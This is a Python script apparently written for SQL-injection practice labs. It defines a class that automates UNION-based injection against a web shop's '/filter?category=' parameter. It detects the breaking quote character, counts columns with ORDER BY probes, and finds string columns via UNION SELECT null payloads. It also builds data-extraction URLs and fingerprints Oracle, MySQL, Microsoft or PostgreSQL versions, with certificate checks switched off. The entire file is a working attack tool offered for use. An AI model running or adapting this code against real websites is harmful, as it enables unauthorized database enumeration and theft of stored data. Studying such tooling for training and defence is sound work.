import sys
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings()

path='/filter?category='


class SQLi:
    def __init__(self,url,path,comment="--",table=""):
        self.session=requests.Session()
        self.session.verify=False
        self.website=self.session.get(url,verify=False)
        self.url=url
        self.path=path
        self.table=table
        self.cmt=comment
        self.sp=self.find_special_char()
        self.payloads={
            "number of columns":None,
            "type of columns":[]
        }
        self.number_of_columns=self.find_columns_nmbre()
        self.type_columns=[self.find_type_column(i,table) for i in range(self.number_of_columns)]
        if not self.website:
            raise '******* Website deosnt WORK !'
    

    #Find What is acceptable " OR '
    def find_special_char(self):
        r=self.session.get(self.url+self.path+"'"+self.cmt)
        if "Error" not in r.text:
            return "'"
        return '"'
    #Find Number of columns in Table
    def find_columns_nmbre(self):
        payload=f"{self.sp} order by "
        j=0
        r=self.website
        f_url=""
        while "Error" not in r.text:
            j+=1
            f_url=self.url+self.path+payload+str(j)+self.cmt
            f_url=str(f_url).replace(" ","+")
            r=self.session.get(f_url,timeout=5,verify=False)
        self.payloads["number of columns"]=f_url
        return j-1

    #FInd column type , i have two types: str, int(number)
    def find_type_column(self,index_column,table=""):
        if 0<=index_column<self.number_of_columns:
            frm=f" from {table}" if table!="" else ""
            payload=["null"]*self.number_of_columns
            payload[index_column]="'string'"
            f_url=self.url+self.path+self.sp+" union select "+",".join(payload)+frm+self.cmt
            f_url=str(f_url).replace(" ","+")
            r=self.session.get(f_url,verify=False,timeout=5)
            if "Error" not in r.text:
                self.payloads["type of columns"].append(f_url)
                return str
            f_url=f_url.replace("'string'","1")
            f_url=str(f_url).replace(" ","+")
            r=self.session.get(f_url,verify=False,timeout=5)
            if "Error" not in r.text:
                self.payloads["type of columns"].append(f_url)
                return int
        return None                                  
                
    #generate a payload url that have table columns condition
    def generate_payload(self,columns,condition="",table=None,choose=None):
        if table==None:
            table=" from "+self.table if self.table!="" else ""
        else:
            table=" from "+table if table!="" else ""
        
        
        payloads=[]
        f_payload=""
        if choose==None:
            choose=input("[?] which method you prefer (default:1) => \n\r1) Show columns separately \n\r2) Show columns in one column \n\rresponce: ")
        if choose!="2":
            """First Method"""
            payload=[]
            i=0
            no_cols=len(columns)
            while i<no_cols and str in self.type_columns:
                for typ in self.type_columns:
                    if typ==str and i<no_cols:
                        payload.append(columns[i])
                        i+=1
                    else:
                        payload.append("null")
                payloads.append(",".join(payload))
                payload=[]
            for pd in payloads:
                f_payload+=f" union select {pd} {table} {condition} "
        else:
            """Second Method"""
            i=self.type_columns.index(str)
            payloads=["null"]*self.number_of_columns
            payloads[i]="|| '~' ||".join(columns)
            add_it=",".join(payloads)
            f_payload=f" union select {add_it} {table} {condition} "
        f_url=self.url+path+self.sp+f_payload+self.cmt
        f_url=str(f_url).replace(" ","+")
        return f_url
    
    #Check if the type version, you choose is valable
    def it_version(self,url_gen,type):
        r=self.session.get(url_gen,verify=False,timeout=5)
        bs=BeautifulSoup(r.text,"html.parser")
        res=bs.find('table')
        if res!=None and type in str(res).lower():
            return True,res.get_text()
        return False,None

    #Find version of database in use 
    def find_version(self):
        url_oracle1=self.generate_payload(["banner"],table="v$version",choose="1")
        res=self.it_version(url_oracle1,"oracle")
        if res[0]:
            return "Oracle",res[1]
        url_oracle2=self.generate_payload(["version"],table="v$instance",choose="1")
        res=self.it_version(url_oracle2,"oracle")
        if res[0]:
            return "Oracle",res[1]
                
        url_mysql_microsoft=self.generate_payload(["@@version"],choose="1")
        r=self.session.get(url_mysql_microsoft)        

        res=self.it_version(url_mysql_microsoft,"mysql")
        if res[0]:
            return "MySQL",res[1]       
         
        res=self.it_version(url_mysql_microsoft,"microsoft")
        if res[0]:
            return "Microsoft",res[1]
        
        
        url_postgre=self.generate_payload(["version()"],choose="1")
        res=self.it_version(url_postgre,"postgresql")
        if res[0]:
            return "PostgreSQL",res[1]
        return "Not found!",None

        

